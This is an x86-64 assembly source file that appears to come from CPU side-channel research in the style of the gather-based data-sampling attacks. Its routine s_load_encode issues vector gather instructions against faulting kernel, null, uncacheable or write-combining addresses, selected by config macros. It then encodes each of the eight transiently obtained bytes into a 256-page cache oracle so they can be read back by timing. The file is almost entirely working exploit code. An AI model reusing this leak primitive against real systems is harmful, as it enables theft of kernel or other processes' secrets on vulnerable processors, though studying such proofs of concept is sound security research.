#include "config.h"

.data

.align 0x1000
    .global oracles
oracles:
    .space 32*4096*256, 0

    .global address_normal
address_normal:
    .space 4096, 0


    .global address_UC
address_UC:
    .space 4096, 0

    .global address_WC
address_WC:
    .space 4096, 0



.text


    # %rdi p perm
    .align 0x1000
    .global s_load_encode
s_load_encode:


#if AVX_512
    vmovups (%rdi), %zmm3
    vpxord %zmm1, %zmm1, %zmm1
    mov $0xffffffffffffffff, %rdi
    kmovq %rdi, %k1
    kmovq %rdi, %k2
#else
    vmovups (%rdi), %ymm3
    vpxord %ymm1, %ymm1, %ymm1
    vpcmpeqb %ymm2, %ymm2, %ymm2
#endif


#if P_CACHE_MISS
    lea address_normal, %rdi

    .set i,0
    .rept 8
    clflush 64*i(%rdi)
    mov 64*i(%rdi), %rax
    .set i,i+1
    .endr 
    
#endif

#if P_PAGE_FAULT
    mov 0, %rdi
#endif
    

#if FAULT_KERNEL
    mov $ADDRESS_KERNEL, %r13
#elif FAULT_NC
    mov $ADDRESS_NC, %r13
#elif FAULT_PF
    mov $0, %r13
#elif ASSIST_UC
    lea address_UC, %r13
#elif ASSIST_WC
    lea address_WC, %r13
#else
    lea address_normal, %r13
#endif

#if AVX_512
    vpgatherdq 0(%r13, %ymm1, 1), %zmm5{%k1}
    vpermd %zmm5, %zmm3, %zmm5{%k2}
#else
    vpgatherdd %ymm2, 0(%r13, %ymm1, 1), %ymm5
    vpermd %ymm5, %ymm3, %ymm5
#endif

     movq %xmm5, %rax 

    mov %rax, %rbx
    mov %rax, %rcx
    mov %rax, %rdx
    mov %rax, %r8
    mov %rax, %r9
    mov %rax, %r10
    mov %rax, %r11
    
    lea oracles+0*256*4096, %r13
    shr $0, %rax
    and $0xff, %rax
    shlq $12, %rax
    mov (%r13,%rax,1), %rax

    lea oracles+1*256*4096, %r13
    shr $8, %rbx
    and $0xff, %rbx
    shlq $12, %rbx
    mov (%r13,%rbx,1), %rax

    lea oracles+2*256*4096, %r13
    shr $16, %rcx
    and $0xff, %rcx
    shlq $12, %rcx
    mov (%r13,%rcx,1), %rax

    lea oracles+3*256*4096, %r13
    shr $24, %rdx
    and $0xff, %rdx
    shlq $12, %rdx
    mov (%r13,%rdx,1), %rax


    lea oracles+4*256*4096, %r13
    shr $32, %r8
    and $0xff, %r8
    shlq $12, %r8
    mov (%r13,%r8,1), %rax

    lea oracles+5*256*4096, %r13
    shr $40, %r9
    and $0xff, %r9
    shlq $12, %r9
    mov (%r13,%r9,1), %rax

    lea oracles+6*256*4096, %r13
    shr $48, %r10
    and $0xff, %r10
    shlq $12, %r10
    mov (%r13,%r10,1), %rax

    lea oracles+7*256*4096, %r13
    shr $56, %r11
    and $0xff, %r11
    shlq $12, %r11
    mov (%r13,%r11,1), %rax
    

    ret
